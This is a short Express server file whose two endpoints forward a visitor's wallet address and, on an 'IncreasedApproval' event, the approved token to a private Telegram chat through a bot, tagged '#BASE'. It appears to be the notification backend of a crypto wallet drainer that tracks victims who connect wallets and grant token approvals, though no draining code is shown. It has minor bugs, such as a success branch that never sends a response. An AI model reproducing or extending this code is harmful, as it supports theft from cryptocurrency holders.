'use server';
import express from 'express';
import axios from 'axios';

import dotenv from 'dotenv';
dotenv.config()

const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT_ID = process.env.TG_CHAT_ID;

export const app = express();

// Enable caching
app.set('etag', false);
app.use((req, res, next) => {
  res.set('Cache-Control', 'public, max-age=3600'); // 1 hour
  next();
});

app.get('/api/telegram/newConnection', async (req, res) => {
  const query = req.query;
  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?` +
    // @ts-ignore
    new URLSearchParams({
    chat_id: TG_CHAT_ID,
    text: `#BASE #NewConnection\n` +
      `Address: ${query.address}\n`
  } as URLSearchParams);
  const response = await axios.get(url);
  if (response.status !== 200) {
    console.error('Failed to send notification to Telegram');
    res.status(500).send('Failed to send notification to Telegram');
  } else res.status(200)
});

app.get('/api/telegram/increasedApproval', async (req, res) => {
  const query = req.query
  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?` +
    // @ts-ignore
    new URLSearchParams({
    chat_id: TG_CHAT_ID,
    text: `#BASE #IncreasedApproval\n` +
      `Address: ${query.address}\n` +
      `Token: ${query.token}`
  });
  const response = await axios.get(url);
  if (response.status !== 200) {
    console.error('Failed to send notification to Telegram');
    res.status(500).send('Failed to send notification to Telegram');
  } else res.status(200)
})

// app.get('/server/telegram/approvalIncreased', async (req, res) => {
//   const query = req.query;
//   const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?` + new URLSearchParams({
//     chat_id: TG_CHAT_ID,
//     text: `#BASE #ApprovalIncreased\n` +
//       `Address: ${query.address}`
//   });
//   const response = await axios.get(url);
//   if (response.status !== 200) {
//     console.error('Failed to send notification to Telegram');
//     res.status(500).send('Failed to send notification to Telegram');
//   } else res.status(200)
// })
//
// app.listen(2111, () => {
//   console.log('Server is running on port 2111');
// });

if (!process.env['VITE']) {
  const frontendFiles = process.cwd() + '/dist'
  app.use(express.static(frontendFiles))
  app.get('/*', (_, res) => {
    res.send(frontendFiles + '/index.html')
  })
  app.listen(process.env['PORT'])
}
